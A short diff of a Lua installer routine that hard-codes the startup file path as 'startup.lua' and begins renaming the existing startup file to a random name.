@@ -210,7 +210,7 @@ local function installer()
     local metadataFilename = generateRandomString(8) -- Set your metadata filename here
     local randomDelimiter = "^"
     createMetadataFile(metadataFilename)
-    originalStartup = getRealStartupPath()
+    originalStartup = "startup.lua"
     oldStartupFileName = generateRandomString(8) -- Does not end with .lua
     if (originalStartup ~= nil) then
         -- Rename the existing startup.lua
